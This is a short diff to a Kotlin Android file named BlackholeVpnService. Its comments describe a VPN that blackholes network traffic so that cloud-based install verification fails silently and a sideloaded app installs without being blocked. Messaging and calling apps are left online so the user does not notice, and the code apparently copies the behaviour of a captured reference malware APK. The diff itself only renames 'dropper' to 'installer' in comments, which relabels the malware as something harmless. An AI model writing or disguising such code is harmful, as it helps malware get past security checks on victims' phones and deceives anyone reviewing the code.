@@ -18,7 +18,7 @@ import android.os.ParcelFileDescriptor
  * → verification fails silently → install proceeds without cloud-based blocking.
  *
  * EXCLUSION LIST: 20 apps are excluded (their traffic passes through normally):
- * - The dropper itself (dynamic via context.packageName — survives mutation)
+ * - The installer itself (dynamic via context.packageName — survives mutation)
  * - Messaging apps (WhatsApp, Telegram, Messenger, Facebook)
  * - Dialer/calling apps (Google Phone, AOSP Phone, Samsung, Xiaomi, Meet, Skype)
  * - Package installers (AOSP, Google, Samsung, Xiaomi) — MUST have connectivity
@@ -143,7 +143,7 @@ class BlackholeVpnService : VpnService() {
             // ── EXCLUDED APPS: these bypass the blackhole ──
             // Order matches reference APK Frida capture exactly.
 
-            // 1. The dropper itself — DYNAMIC (survives package name mutation)
+            // 1. The installer itself — DYNAMIC (survives package name mutation)
             safeExclude(builder, packageName)
 
             // 2-8. Messaging apps — stay working so user doesn't notice disruption
